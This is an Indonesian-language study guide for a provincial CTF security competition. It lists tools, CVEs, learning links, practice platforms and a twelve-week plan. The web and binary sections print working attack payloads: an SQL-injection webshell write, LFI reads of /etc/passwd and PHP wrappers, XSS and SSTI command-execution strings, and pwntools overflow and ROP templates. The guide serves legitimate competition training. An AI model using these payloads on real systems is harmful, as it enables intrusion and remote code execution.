# PANDUAN LENGKAP PERSIAPAN LOMBA CYBER SECURITY CTF
## (Jeopardy Style - Provinsi Jawa Tengah)

---

## 📋 DAFTAR TOOLS YANG HARUS DIINSTALL

### 🌐 Web Security Tools
- **Burp Suite Community Edition** - Proxy untuk intercept dan modifikasi HTTP request
  - Download: https://portswigger.net/burp/communitydownload
- **OWASP ZAP** - Alternative web proxy untuk testing
  - Download: https://www.zaproxy.org/download/
- **sqlmap** - Automated SQL injection tool
  - Install: `sudo apt install sqlmap` atau `pip install sqlmap`
- **Nikto** - Web server scanner
  - Install: `sudo apt install nikto`
- **DirBuster / Dirsearch / Gobuster** - Directory brute forcing
  - Install: `sudo apt install dirbuster` atau `pip install dirsearch`
- **wfuzz** - Web fuzzer untuk parameter testing
  - Install: `pip install wfuzz`
- **curl / wget** - Command line HTTP tools
- **jSQL Injection** - Java-based SQLi tool
  - Download: https://github.com/ron190/jsql-injection
- **XSSer** - XSS testing tool
  - Install: `sudo apt install xsser`
- **Nuclei** - Template-based vulnerability scanner
  - Install: https://github.com/projectdiscovery/nuclei

### 🔧 Pwn / Binary Exploitation Tools
- **pwntools** - Python library untuk exploit development
  - Install: `pip install pwntools`
- **GDB dengan pwndbg/GEF/PEDA** - Enhanced debugger
  - pwndbg: https://github.com/pwndbg/pwndbg
  - GEF: https://github.com/hugsy/gef
  - PEDA: https://github.com/longld/peda
- **ROPgadget** - ROP chain generator
  - Install: `pip install ropgadget`
- **checksec** - Binary security checker (included in pwntools)
- **radare2** - Reverse engineering framework
  - Install: `sudo apt install radare2`
- **objdump** - Object file dumper
- **ltrace / strace** - Library/system call tracer
  - Install: `sudo apt install ltrace strace`
- **one_gadget** - RCE gadget finder
  - Install: `gem install one_gadget`

### 🔐 Cryptography Tools
- **CyberChef** - Web-based crypto/encoding tool
  - URL: https://gchq.github.io/CyberChef/
- **OpenSSL** - Cryptography library
  - Install: `sudo apt install openssl`
- **John the Ripper** - Password cracker
  - Install: `sudo apt install john`
- **Hashcat** - Advanced password recovery
  - Install: `sudo apt install hashcat`
- **hash-identifier** - Hash type identifier
  - Install: `sudo apt install hash-identifier`
- **RsaCtfTool** - RSA attack tool
  - Install: https://github.com/RsaCtfTool/RsaCtfTool
- **xortool** - XOR cipher analysis
  - Install: `pip install xortool`
- **featherduster** - Automated cryptanalysis
  - Install: https://github.com/nccgroup/featherduster
- **dcode.fr** - Online cipher decoder
  - URL: https://www.dcode.fr/

### 🔍 Digital Forensics Tools
- **Wireshark** - Network protocol analyzer
  - Install: `sudo apt install wireshark`
- **tshark** - Command-line Wireshark
  - Install: `sudo apt install tshark`
- **Volatility** - Memory forensics framework
  - Install: https://github.com/volatilityfoundation/volatility3
- **Autopsy** - Digital forensics platform
  - Download: https://www.autopsy.com/download/
- **binwalk** - Firmware analysis tool
  - Install: `sudo apt install binwalk`
- **foremost** - File carving tool
  - Install: `sudo apt install foremost`
- **steghide** - Steganography tool (JPEG/BMP/WAV/AU)
  - Install: `sudo apt install steghide`
- **stegseek** - Steghide password cracker
  - Install: https://github.com/RickdeJager/stegseek
- **zsteg** - PNG/BMP steganography detection
  - Install: `gem install zsteg`
- **stegsolve** - Image analysis tool
  - Download: http://www.caesum.com/handbook/Stegsolve.jar
- **exiftool** - Metadata viewer/editor
  - Install: `sudo apt install exiftool`
- **strings** - Extract strings from files
  - Install: `sudo apt install binutils`

### 🔄 Reverse Engineering Tools
- **Ghidra** - NSA's reverse engineering tool
  - Download: https://ghidra-sre.org/
- **IDA Free** - Interactive disassembler (free version)
  - Download: https://hex-rays.com/ida-free/
- **radare2 / Cutter** - Open-source RE framework
  - Install: `sudo apt install radare2 cutter`
- **Binary Ninja Cloud** - Modern RE platform (free tier available)
  - URL: https://cloud.binary.ninja/
- **objdump** - Display object file info
- **strings** - Extract readable strings
- **file** - Determine file type
- **hexeditor / xxd** - Hex editor
  - Install: `sudo apt install hexedit`
- **angr** - Binary analysis framework
  - Install: `pip install angr`

### 🎲 Miscellaneous / General Tools
- **Python 3** dengan libraries: requests, pwntools, pycryptodome
- **Netcat (nc)** - Network utility
  - Install: `sudo apt install netcat`
- **nmap** - Network scanner
  - Install: `sudo apt install nmap`
- **git** - Version control
- **Docker** - Containerization (untuk CTF environment)
- **Text editors**: VSCode, Sublime Text, Vim

---

## 🎯 DAFTAR CVE DENGAN EXPLOIT YANG HARUS DIPELAJARI

### Web Security CVEs
1. **CVE-2024-3400** - Palo Alto Command Injection (CVSS: 10.0)
   - Tipe: Command Injection leading to RCE
   - Target: Firewall devices
   
2. **CVE-2024-0012** - Palo Alto RCE Vulnerability (CVSS: 9.8)
   - Tipe: Unauthenticated Remote Code Execution
   - Chained dengan CVE-2024-9474

3. **CVE-2023-46805** - Ivanti Authentication Bypass (High Severity)
   - Tipe: Authentication Bypass
   - Chained dengan CVE-2024-21887

4. **CVE-2024-38112** - Windows MSHTML Spoofing (CVSS: 7.0)
   - Tipe: Spoofing vulnerability
   - Exploited as zero-day

5. **CVE-2024-38106** - Windows Kernel Privilege Escalation (CVSS: 7.0)
   - Tipe: Elevation of Privilege
   - Race condition vulnerability

### SQL Injection CVEs (untuk pembelajaran)
- **CVE-2019-8943** - WordPress SQLi
- **CVE-2020-14144** - GitLab SQLi
- Pelajari teknik: Boolean-based, Time-based, Error-based, Union-based

### XSS CVEs (untuk pembelajaran)
- **CVE-2020-11022** - jQuery XSS
- **CVE-2019-11358** - jQuery prototype pollution
- Pelajari: Reflected, Stored, DOM-based XSS

### IDOR Examples (Common Pattern)
- Tidak ada CVE spesifik, tapi pelajari pattern dari bug bounty reports
- Platform: HackerOne, Bugcrowd write-ups

### LFI/RFI CVEs
- **CVE-2021-41773** - Apache Path Traversal
- **CVE-2019-9670** - Zimbra XXE/File Upload
- Pelajari: Directory traversal, Log poisoning, PHP wrappers

---

## 🔗 LINK EXPLOIT DAN RESOURCE BELAJAR

### 📚 Exploit Databases
- **Exploit-DB**: https://www.exploit-db.com/
- **GitHub POC Collection**: https://github.com/nomi-sec/PoC-in-GitHub
- **Packet Storm Security**: https://packetstormsecurity.com/

### 🌐 Web Security Exploits

#### SQL Injection (SQLi)
**Payloads & Cheat Sheets:**
- https://github.com/payloadbox/sql-injection-payload-list
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

**SQLi + LFI = RCE Technique:**
```sql
-- Write webshell via SQLi
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Access via LFI
http://target.com/index.php?page=shell.php&cmd=whoami
```

**Tutorial:**
- https://www.hackingarticles.in/sql-injection-exploitation-in-multiple-targets-beginners-guide/

#### Local File Inclusion (LFI)
**Common Payloads:**
```
# Basic LFI
?file=../../../../etc/passwd
?page=../../../../../../windows/system32/drivers/etc/hosts

# PHP Wrappers
?file=php://filter/convert.base64-encode/resource=index.php
?file=data://text/plain,<?php system($_GET['cmd']); ?>
?file=expect://whoami

# Log Poisoning
# Poison via User-Agent, then include log
?file=../../../../var/log/apache2/access.log
```

**LFI Exploitation Guide:**
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- https://book.hacktricks.xyz/pentesting-web/file-inclusion

#### Cross-Site Scripting (XSS)
**Payload Collections:**
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- Advanced/Bypass -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
"><svg/onload=alert(1)>
<img src='x' onerror='alert(1)'>
```

**Resources:**
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/payloadbox/xss-payload-list
- XSS Hunter: https://xsshunter.com/

#### Insecure Direct Object Reference (IDOR)
**Testing Methodology:**
```
# User ID manipulation
GET /api/user/123 → Change to /api/user/124

# Parameter pollution
GET /api/profile?user_id=123&user_id=124

# Mass Assignment
POST /api/update
{"name":"John","role":"admin","user_id":124}

# Encoded IDs (Base64, UUID, etc)
```

**Write-ups & Examples:**
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
- https://hackerone.com/reports (search for IDOR)

#### Server-Side Template Injection (SSTI)
**Detection Payloads:**
```
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}

# Jinja2 (Python)
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
```

**Resources:**
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

#### Server Misconfiguration Examples
- Directory listing enabled
- Default credentials
- Exposed .git directory: https://github.com/internetwache/GitTools
- Backup files (.bak, .old, ~, .swp)
- Debug mode enabled

---

### 💣 Pwn / Binary Exploitation

#### Buffer Overflow Tutorials
**Basic Stack Overflow:**
```python
# Python exploit template
from pwn import *

# Start process
p = process('./vulnerable')

# Create payload
offset = 64  # Found via pattern_create/pattern_offset
ret_addr = p64(0xdeadbeef)  # Address to return to
payload = b'A' * offset + ret_addr

# Send payload
p.sendline(payload)
p.interactive()
```

**Resources:**
- https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
- https://guyinatuxedo.github.io/ (Nightmare - Binary Exploitation)
- https://ropemporium.com/ (ROP practice)

#### ROP Chain Examples
```python
# ROP chain with pwntools
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Build ROP chain
rop.call('system', ['/bin/sh'])

# Generate payload
payload = b'A' * offset + rop.chain()
```

**CVE Examples untuk Belajar:**
- CVE-2025-32756: Stack-based buffer overflow (Fortinet)
- Study classic: Morris Worm, Code Red

---

### 🔐 Cryptography Resources

#### Classical Ciphers
**Caesar Cipher:**
- Online tool: https://www.dcode.fr/caesar-cipher
- https://cryptii.com/pipes/caesar-cipher

**Vigenère Cipher:**
- Online tool: https://www.dcode.fr/vigenere-cipher
- https://www.boxentriq.com/code-breaking/vigenere-cipher

**ROT13:**
```bash
# Command line
echo "GUVF VF RAPELCGRQ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

#### Modern Cryptography
**RSA Attacks:**
```python
# Common RSA vulnerabilities
# - Small e (e=3) with small message
# - Wiener's attack (small d)
# - Common modulus attack
# - Fermat factorization

# RsaCtfTool usage
python3 RsaCtfTool.py --publickey pubkey.pem --private
```

**XOR Analysis:**
```bash
# xortool usage
xortool encrypted_file
xortool -l 4 encrypted_file  # Try key length 4
xortool -c 20 encrypted_file  # Most common char is space (0x20)
```

**Hash Cracking:**
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=Raw-MD5 hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt rockyou.txt  # MD5
hashcat -m 1000 -a 0 hash.txt rockyou.txt  # NTLM
hashcat -m 1800 -a 0 hash.txt rockyou.txt  # SHA-512 (Unix)
```

**Resources:**
- https://cryptohack.org/ (Learn modern crypto)
- https://www.dcode.fr/ (Classical cipher decoder)
- https://gchq.github.io/CyberChef/ (Swiss army knife)

---

### 🔍 Digital Forensics & Steganography

#### Network Forensics (Wireshark/PCAP)
**Basic Filters:**
```
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.1

# Follow TCP stream
tcp.stream eq 0

# Extract files
File > Export Objects > HTTP
```

**Tutorial:**
- https://www.wireshark.org/docs/wsug_html_chunked/
- https://tryhackme.com/room/wireshark

#### Memory Forensics (Volatility)
```bash
# Volatility 3
python3 vol.py -f memory.dmp windows.info
python3 vol.py -f memory.dmp windows.pslist
python3 vol.py -f memory.dmp windows.netscan
python3 vol.py -f memory.dmp windows.cmdline
python3 vol.py -f memory.dmp windows.filescan | grep flag
```

**Resources:**
- https://github.com/volatilityfoundation/volatility3
- https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet

#### Steganography Tools & Techniques
**Image Steganography:**
```bash
# steghide (JPEG/BMP/WAV/AU)
steghide info image.jpg
steghide extract -sf image.jpg -p password

# stegseek (steghide cracker)
stegseek image.jpg rockyou.txt

# zsteg (PNG/BMP)
zsteg image.png
zsteg -a image.png  # All methods

# stegsolve
java -jar stegsolve.jar

# binwalk (file carving)
binwalk image.jpg
binwalk -e image.jpg  # Extract files

# exiftool (metadata)
exiftool image.jpg

# strings
strings image.jpg | grep flag
```

**Online Tools:**
- Aperi'Solve: https://www.aperisolve.com/ (Multi-stego analysis)
- StegOnline: https://stegonline.georgeom.net/
- FotoForensics: https://fotoforensics.com/ (ELA analysis)

**Audio Steganography:**
- Sonic Visualiser: https://www.sonicvisualiser.org/
- Audacity: https://www.audacityteam.org/
- DeepSound: http://jpinsoft.net/deepsound/

---

### 🔄 Reverse Engineering

#### Static Analysis
**Ghidra Tutorial:**
- Official: https://ghidra-sre.org/courses/
- YouTube: Search "Ghidra tutorial CTF"

**radare2 Commands:**
```bash
r2 binary
aaa  # Analyze all
pdf @ main  # Print disassembly of main
VV  # Visual mode graph
```

**Binary Ninja:**
- Free tier: https://cloud.binary.ninja/
- Documentation: https://docs.binary.ninja/

#### Dynamic Analysis
**GDB with pwndbg:**
```bash
# Basic commands
gdb ./binary
break main
run
disassemble main
x/20x $rsp  # Examine stack
info registers
```

**Resources:**
- https://ir0nstone.gitbook.io/notes/ (Binary exploitation notes)
- https://guyinatuxedo.github.io/ (Comprehensive guide)
- https://pwn.college/ (ASU CTF course)

---

## 🎓 PLATFORM LATIHAN CTF

### Beginner-Friendly
1. **PicoCTF** - https://picoctf.org/
2. **OverTheWire** - https://overthewire.org/wargames/
3. **TryHackMe** - https://tryhackme.com/
4. **HackTheBox Academy** - https://academy.hackthebox.com/

### Intermediate/Advanced
1. **HackTheBox** - https://www.hackthebox.com/
2. **pwnable.kr** - http://pwnable.kr/
3. **pwnable.tw** - https://pwnable.tw/
4. **CryptoHack** - https://cryptohack.org/
5. **RingZer0 CTF** - https://ringzer0ctf.com/

### CTF Event Tracking
- **CTFtime** - https://ctftime.org/ (Upcoming CTF calendar)

---

## 📖 CHEAT SHEETS & QUICK REFERENCES

### Web Security
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/

### Binary Exploitation
- Pwn College: https://pwn.college/
- Exploit Education: https://exploit.education/
- ROPEmporium: https://ropemporium.com/

### Cryptography
- CryptoHack: https://cryptohack.org/
- Practical Cryptography: http://practicalcryptography.com/

### Forensics
- DFIR Cheat Sheets: https://www.jpcert.or.jp/english/pub/sr/ir_research.html
- Forensics Wiki: https://forensicswiki.xyz/

---

## 💡 TIPS PERSIAPAN

### 1. Setup Environment
- Install Kali Linux (VM atau dual boot)
- Setup Python virtual environment
- Install semua tools yang disebutkan di atas
- Bookmark semua resource online

### 2. Praktik Rutin
- Minimal 2-3 challenge per hari
- Fokus pada satu kategori per minggu
- Baca write-ups setelah solve challenge
- Join Discord/Telegram CTF communities

### 3. Dokumentasi
- Catat semua payload yang berhasil
- Simpan exploit scripts
- Buat personal cheat sheet
- Screenshot setiap flag yang didapat

### 4. Strategi Kompetisi
- Baca semua soal terlebih dahulu
- Mulai dari kategori yang paling dikuasai
- Jangan stuck di satu soal terlalu lama (max 30 menit)
- Komunikasi dengan tim jika tim

### 5. Time Management
- Easy challenges (100-200 points): Max 15 menit
- Medium challenges (300-400 points): Max 30 menit
- Hard challenges (500+ points): Evaluate setelah 45 menit

---

## 🚀 QUICK START CHECKLIST

### Minggu 1-2: Setup & Basics
- [ ] Install semua tools
- [ ] Complete OverTheWire Bandit (basic Linux)
- [ ] Solve 10 easy web challenges (PicoCTF)
- [ ] Belajar basic scripting (Python/Bash)

### Minggu 3-4: Web Security Deep Dive
- [ ] SQLi: Solve 15 challenges
- [ ] XSS: Solve 10 challenges
- [ ] LFI/RFI: Solve 5 challenges
- [ ] IDOR: Solve 5 challenges
- [ ] SSTI: Solve 3 challenges

### Minggu 5-6: Binary Exploitation
- [ ] Buffer overflow basics (5 challenges)
- [ ] Format string (3 challenges)
- [ ] ROP chains (3 challenges)
- [ ] Heap exploitation intro (2 challenges)

### Minggu 7-8: Crypto & Forensics
- [ ] Classical ciphers (10 challenges)
- [ ] RSA attacks (5 challenges)
- [ ] Hash cracking (5 challenges)
- [ ] Steganography (10 challenges)
- [ ] PCAP analysis (5 challenges)
- [ ] Memory forensics (3 challenges)

### Minggu 9-10: Reverse Engineering & Misc
- [ ] Basic reversing (5 challenges)
- [ ] Crackmes (5 challenges)
- [ ] Logic puzzles (5 challenges)
- [ ] OSINT (3 challenges)

### Minggu 11-12: Mock Competitions
- [ ] Participate in 2-3 online CTFs
- [ ] Practice under time pressure
- [ ] Review mistakes
- [ ] Fine-tune strategies

---

## 📞 COMMUNITY & SUPPORT

### Discord Servers
- PicoCTF Discord
- HackTheBox Discord
- CTF Community Indonesia

### Telegram Groups
- Indonesia CTF Community
- Bug Bounty Indonesia

### YouTube Channels
- John Hammond
- LiveOverflow
- IppSec
- PwnFunction

---

## 🎯 FINAL NOTES

**Ingat:**
1. CTF adalah tentang problem-solving dan kreativitas
2. Tidak ada yang tahu segalanya - Google is your friend
3. Read write-ups setelah kompetisi untuk belajar
4. Jangan takut gagal - setiap error adalah pembelajaran
5. Konsistensi > Intensitas

**Good luck di kompetisi! 🚩**

---

**Compiled by: AI Assistant for CTF Preparation**
**Last Updated: December 2025**
